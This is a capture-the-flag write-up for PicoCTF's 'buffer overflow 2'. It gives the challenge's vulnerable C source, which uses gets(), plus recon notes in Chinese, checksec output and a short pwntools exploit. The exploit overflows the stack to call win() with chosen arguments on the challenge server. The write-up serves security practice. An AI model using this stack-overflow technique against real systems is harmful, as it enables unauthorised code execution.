---
title: PicoCTF - buffer overflow 2
tags: [PicoCTF, CTF, PWN]

category: "Security/Practice/PicoCTF/PWN"
---

# PicoCTF - buffer overflow 2
## Background
Bof
## Source code
:::spoiler Source Code
```cpp=
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}


```
:::
## Recon
寫這一題的心境變化真的很有趣，一開始看直覺很簡單，就基礎的return 2 function就結束了，不過看到還要處理calling convention的問題就有點燒腦，首先我一開始的想法是控制edi和esi的數值過掉她的checking，直覺就是用rop之類的東西，不過這隻程式本身能用的gadget少的可憐，如果要用到libc本身的gadget就必須要克服aslr的base address，想到這邊頭就開始痛了，無論如何先用gdb跟一下，發現檢查的argument就在ebp+0x8和ebp+0x10的地方，這就代表離原本的bof不遠，所以試看看能不能延伸bof的內容，果然事情比我想像中的簡單，需要注意的地方是payload中return win function的部分不能馬上接checking payload，因為執行的過程中0xcafefood會被蓋掉，所以中間需要加一個dummy value
```bash!
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a429aa852db1511dec3f0143d93e5b1e80e4d845, for GNU/Linux 3.2.0, not stripped
$ checksec vuln
[*] '/mnt/d/NTU/CTF/PicoCTF/PWN/buffer overflow 2/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## Exploit
```python=
from pwn import *

r = remote('saturn.picoctf.net', 50995)
# r = process('./vuln')
context.arch = 'amd64'

r.recvline()

r.sendline(b'a' * 0x70 + p32(0x8049296) + p32(0) + p32(0xCAFEF00D) + p32(0xF00DF00D))

r.interactive()
```